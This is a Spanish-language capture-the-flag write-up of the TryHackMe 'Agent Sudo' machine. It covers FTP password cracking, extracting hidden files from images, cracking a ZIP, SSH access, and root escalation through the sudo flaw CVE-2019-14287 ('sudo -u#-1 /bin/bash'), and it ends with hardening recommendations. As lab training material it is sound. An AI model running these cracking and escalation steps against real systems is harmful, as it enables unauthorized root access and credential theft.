
# LAB-010 — EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS

**Proyecto:** FANTASMA — Pentesting & Red Team  
**Plataforma:** TryHackMe  
**Máquina:** Agent Sudo  
**Sistema:** Ubuntu 18.04.3 LTS  
**Fecha:** 20/11/2026  
**Resultado:** Acceso root confirmado

---

## 1. Objetivo

Obtener acceso inicial al sistema mediante las pistas identificadas durante el reconocimiento y evaluar posibles vías de escalada de privilegios.

Todas las pruebas se realizaron dentro del entorno autorizado de TryHackMe.

## 2. Acceso al servidor FTP

Durante el reconocimiento se identificó al usuario `chris`.

Se utilizó Hydra con el diccionario RockYou para recuperar su contraseña FTP.

Tras autenticarnos, encontramos tres archivos:

- `To_agentJ.txt`
- `cutie.png`
- `cute-alien.jpg`

El mensaje dirigido al agente J indicaba que sus credenciales estaban ocultas en una fotografía.

## 3. Análisis de cutie.png

Se utilizó Binwalk para identificar contenido incrustado:

    binwalk cutie.png

Se detectó un archivo ZIP cifrado dentro de la imagen.

Para extraer los archivos identificados:

    binwalk -e cutie.png

El directorio de extracción contenía el archivo:

    _cutie.png.extracted/8702.zip

## 4. Recuperación de contraseña ZIP

Se generó un hash compatible con John the Ripper:

    zip2john _cutie.png.extracted/8702.zip > zip.hash

Posteriormente se utilizó RockYou:

    john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

La contraseña recuperada permitió extraer `To_agentR.txt`.

El documento contenía una cadena codificada en Base64.

## 5. Decodificación Base64

Se ejecutó:

    echo 'QXJlYTUx' | base64 -d

Resultado:

    Area51

Esta información proporcionó una nueva pista para investigar la segunda imagen.

## 6. Esteganografía

Se descargó `cute-alien.jpg` desde FTP.

Primero se analizó con Steghide:

    steghide info cute-alien.jpg

Después se utilizó Stegseek:

    stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt

Stegseek recuperó un documento oculto denominado originalmente `message.txt`, que se extrajo como:

    cute-alien.jpg.out

El documento contenía las credenciales SSH del usuario `james`.

## 7. Acceso inicial mediante SSH

Se estableció una conexión autenticada:

    ssh james@10.67.163.128

Una vez dentro se enumeró el directorio personal:

    ls -la

Se identificaron, entre otros, los archivos:

- `Alien_autospy.jpg`
- `user_flag.txt`

Se recuperó la bandera de usuario y se confirmó el acceso inicial.

## 8. Enumeración de privilegios

Se consultaron los permisos sudo del usuario:

    sudo -l

Resultado relevante:

    (ALL, !root) /bin/bash

La regla permitía ejecutar Bash como otros usuarios, pero excluía explícitamente a root.

Se comprobó la versión instalada:

    sudo --version

Resultado:

    Sudo version 1.8.21p2

## 9. Escalada mediante CVE-2019-14287

**Vulnerabilidad:** CVE-2019-14287  
**Componente:** sudo  
**Versión observada:** 1.8.21p2  
**Impacto:** Escalada local de privilegios

Se aprovechó el tratamiento incorrecto de determinados identificadores de usuario en la versión vulnerable.

Comando ejecutado en el laboratorio:

    sudo -u#-1 /bin/bash

La terminal cambió a una sesión con identidad root.

Se verificó mediante:

    id

Resultado:

    uid=0(root) gid=1000(james) groups=1000(james)

El valor `uid=0(root)` confirmó la escalada de privilegios.

## 10. Recuperación de la bandera final

Con los privilegios obtenidos se examinó:

    ls -la /root

Se identificó el archivo:

    /root/root.txt

La lectura del documento confirmó la recuperación de la bandera final del laboratorio.

## 11. Cadena de compromiso

1. Reconocimiento de servicios.
2. Enumeración HTTP mediante User-Agent.
3. Descubrimiento del usuario FTP.
4. Recuperación de contraseña mediante diccionario.
5. Acceso FTP y descarga de archivos.
6. Extracción de ZIP incrustado en PNG.
7. Recuperación de contraseña ZIP.
8. Decodificación Base64.
9. Extracción esteganográfica.
10. Recuperación de credenciales SSH.
11. Acceso al sistema como James.
12. Enumeración de permisos sudo.
13. Explotación de CVE-2019-14287.
14. Confirmación de privilegios root.
15. Recuperación de la bandera final.

## 12. Recomendaciones

- Actualizar sudo a una versión corregida.
- Revisar periódicamente la configuración sudoers.
- Aplicar contraseñas robustas y únicas.
- Evitar almacenar credenciales en archivos accesibles.
- Restringir el acceso a servicios innecesarios.
- Monitorizar los intentos de autenticación y la elevación de privilegios.

## 13. Conclusión

El laboratorio permitió practicar una cadena completa de explotación, desde la enumeración inicial hasta la obtención de privilegios de administrador.

La combinación de contraseñas débiles, exposición de información y una configuración vulnerable de sudo permitió comprometer completamente el sistema del laboratorio.

**Estado final:** LAB-010 AGENT SUDO completado.

---

**FANTASMA — Pentesting & Red Team**
